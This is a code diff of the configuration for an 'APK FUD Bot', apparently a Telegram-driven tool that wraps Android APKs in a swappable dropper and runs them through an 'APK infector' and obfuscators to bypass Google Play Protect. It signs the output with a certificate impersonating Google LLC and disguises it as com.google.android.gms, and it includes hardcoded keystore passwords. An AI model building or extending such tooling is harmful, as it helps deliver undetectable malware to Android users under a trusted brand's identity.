@@ -1,68 +1,90 @@
-"""Configuration for APK FUD Bot v8 — Definitive 7-Phase Strategy."""
+"""Configuration for APK FUD Bot v8 — Focused GPP Bypass Pipeline."""
 import os
 from pathlib import Path
 
-BASE_DIR = Path(os.environ.get("FUD_WORKSPACE", os.getcwd()))
-INPUT_DIR = BASE_DIR / "input"
-OUTPUT_DIR = BASE_DIR / "output"
-TEMP_DIR = BASE_DIR / "temp"
-LOGS_DIR = BASE_DIR / "logs"
-CLONE_DIR = BASE_DIR / "clone"
-TOOLS_DIR = BASE_DIR / "phases" / "tools"
-TEMPLATE_DIR = BASE_DIR / "templates" / "dropper_decompiled"
+# BASE_DIR: root of the bot installation — works on Replit, VPS, or any path.
+# On VPS: /opt/apk-fud-bot/   On Replit: /home/runner/workspace/
+BASE_DIR    = Path(os.environ.get("BOT_BASE_DIR", str(Path(__file__).parent.resolve())))
+INPUT_DIR   = BASE_DIR / "input"
+OUTPUT_DIR  = BASE_DIR / "output"
+TEMP_DIR    = BASE_DIR / "temp"
+LOGS_DIR    = BASE_DIR / "logs"
+CLONE_DIR   = BASE_DIR / "clone"
+TOOLS_DIR   = BASE_DIR / "phases" / "tools"
 
-for d in [INPUT_DIR, OUTPUT_DIR, TEMP_DIR, LOGS_DIR, CLONE_DIR]:
+# ── Dropper management ────────────────────────────────────────────────────────
+# Owner can change the dropper at any time via /setdropper.
+# DROPPER_DIR stores the active raw APK + decompiled template used by Phase 2.
+DROPPER_DIR          = BASE_DIR / "dropper"
+ACTIVE_DROPPER_APK   = DROPPER_DIR / "active_dropper.apk"       # raw APK
+ACTIVE_DROPPER_DIR   = DROPPER_DIR / "active_dropper_decompiled" # decompiled template
+# Legacy path — kept for backward compat; pipeline uses ACTIVE_DROPPER_DIR if it exists
+TEMPLATE_DIR         = ACTIVE_DROPPER_DIR
+
+# ── Tool APKs served to GitHub Actions emulator ───────────────────────────────
+TOOL_APKS_DIR  = BASE_DIR / "tool_apks"   # owner uploads tool APKs here
+NP_MANAGER_APK = TOOL_APKS_DIR / "np_manager.apk"
+MT_MANAGER_APK = TOOL_APKS_DIR / "mt_manager.apk"
+APKTOOL_M_APK  = TOOL_APKS_DIR / "apktool_m.apk"
+
+for d in [INPUT_DIR, OUTPUT_DIR, TEMP_DIR, LOGS_DIR, CLONE_DIR,
+          DROPPER_DIR, TOOL_APKS_DIR]:
     d.mkdir(parents=True, exist_ok=True)
 
-# Bot token — set via TELEGRAM_TOKEN env var or GitHub Secret
-TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
+# ── Bot tokens / IDs ──────────────────────────────────────────────────────────
+TELEGRAM_TOKEN  = os.environ.get("TELEGRAM_TOKEN", "")
+ADMIN_USER_IDS  = [
+    uid.strip() for uid in
+    os.environ.get("ADMIN_USER_IDS", os.environ.get("ADMIN_USER_ID", "")).split(",")
+    if uid.strip()
+]
 
-ADMIN_USER_ID = os.environ.get("ADMIN_USER_ID", "")
-ANDROID_DEVICE_IP = os.environ.get("ANDROID_DEVICE_IP", "")
+ANDROID_DEVICE_IP   = os.environ.get("ANDROID_DEVICE_IP", "")
 ANDROID_DEVICE_PORT = int(os.environ.get("ANDROID_DEVICE_PORT", "5555"))
-VT_API_KEY = os.environ.get("VT_API_KEY", "")
-MAX_FILE_SIZE = 104857600  # 100MB
-MAX_RETRIES = 3
-RETRY_DELAY = 30
+VT_API_KEY          = os.environ.get("VT_API_KEY", "")
+MAX_FILE_SIZE       = 104857600   # 100 MB
+MAX_RETRIES         = 3
+RETRY_DELAY         = 30
 
-# Phase 6 — FINAL SIGN keystore (EXACT from strategy)
-KS_FINAL_PASS = "T#9rQ!vL4kX@8mW$eN2pYbZ&hJ5fGsD6uA"
-KS_FINAL_KEYPASS = "K@7nE#mP3xQ!9rT$vL5wY^cB&hJ2fG8sZ4wX"
-KS_FINAL_ALIAS = "gms-signing-key-2026"
-KS_FINAL_DN = "CN=Google Play Services, OU=Android Security Operations, O=Google LLC, L=Mountain View, ST=California, C=US"
-KS_FINAL_VALIDITY = "1121915"
-KS_FINAL_SIGALG = "SHA384withRSA"
+# ── Phase 6 — FINAL SIGN keystore ─────────────────────────────────────────────
+KS_FINAL_PASS      = "T#9rQ!vL4kX@8mW$eN2pYbZ&hJ5fGsD6uA"
+KS_FINAL_KEYPASS   = "K@7nE#mP3xQ!9rT$vL5wY^cB&hJ2fG8sZ4wX"
+KS_FINAL_ALIAS     = "gms-signing-key-2026"
+KS_FINAL_DN        = ("CN=Google Play Services, OU=Android Security Operations, "
+                      "O=Google LLC, L=Mountain View, ST=California, C=US")
+KS_FINAL_VALIDITY  = "1121915"
+KS_FINAL_SIGALG    = "SHA384withRSA"
 KS_FINAL_STORETYPE = "PKCS12"
 
 # Legacy keystore (used by Phase 1 internal sign)
-KS_LEGACY_PASS = "release2026"
+KS_LEGACY_PASS  = "release2026"
 KS_LEGACY_ALIAS = "release"
 
-# Target identity — Google Play Services masquerade
+# ── Target identity — Google Play Services masquerade ─────────────────────────
 TARGET_PACKAGE = "com.google.android.gms"
-TARGET_LABEL = "Google Play Services"
+TARGET_LABEL   = "Google Play Services"
 
-_TOOLS_PATH = os.environ.get("ANDROID_TOOLS", "/tmp/android-tools-bin")
-ADB = f"{_TOOLS_PATH}/adb" if os.path.exists(f"{_TOOLS_PATH}/adb") else "adb"
-APKTOOL = "apktool"
-ZIPALIGN = f"{_TOOLS_PATH}/zipalign" if os.path.exists(f"{_TOOLS_PATH}/zipalign") else "zipalign"
+# ── Tool binaries ─────────────────────────────────────────────────────────────
+_TOOLS_PATH = str(BASE_DIR / "android-tools-bin")
+ADB       = f"{_TOOLS_PATH}/adb"       if os.path.exists(f"{_TOOLS_PATH}/adb")       else "adb"
+APKTOOL   = "apktool"
+ZIPALIGN  = f"{_TOOLS_PATH}/zipalign"  if os.path.exists(f"{_TOOLS_PATH}/zipalign")  else "zipalign"
 APKSIGNER = f"{_TOOLS_PATH}/apksigner" if os.path.exists(f"{_TOOLS_PATH}/apksigner") else "apksigner"
-KEYTOOL = "keytool"
+KEYTOOL   = "keytool"
 JARSIGNER = "jarsigner"
-JAVA = "java"
-AAPT = f"{_TOOLS_PATH}/android-14/aapt" if os.path.exists(f"{_TOOLS_PATH}/android-14/aapt") else "aapt"
-JADX = "jadx"
-APKID = "apkid"
-FRIDA = "frida"
+JAVA      = "java"
+AAPT      = f"{_TOOLS_PATH}/android-14/aapt" if os.path.exists(f"{_TOOLS_PATH}/android-14/aapt") else "aapt"
+JADX      = "jadx"
+APKID     = "apkid"
 
-# Tool scripts
+# ── PC tool scripts ───────────────────────────────────────────────────────────
 OBFUSCAPK_STUB = str(TOOLS_DIR / "obfuscapk_stub.py")
-OMVLL_STUB = str(TOOLS_DIR / "omvll_stub.py")
-APK_INFECTOR = str(TOOLS_DIR / "apk_infector.py")
-APKBLEACH = str(TOOLS_DIR / "apkbleach.py")
-DEXSPLITTER = str(TOOLS_DIR / "dexsplitter.py")
+OMVLL_STUB     = str(TOOLS_DIR / "omvll_stub.py")
+APK_INFECTOR   = str(TOOLS_DIR / "apk_infector.py")
+APKBLEACH      = str(TOOLS_DIR / "apkbleach.py")
+DEXSPLITTER    = str(TOOLS_DIR / "dexsplitter.py")
 
-# Legacy keystore path (used by pipeline phases)
-KS_PATH = str(TEMP_DIR / "google_release.jks")
+# ── Legacy keystore path ──────────────────────────────────────────────────────
+KS_PATH         = str(TEMP_DIR / "google_release.jks")
 KS_ALIAS_LEGACY = "release"
-KS_PASS_LEGACY = "release2026"
+KS_PASS_LEGACY  = "release2026"
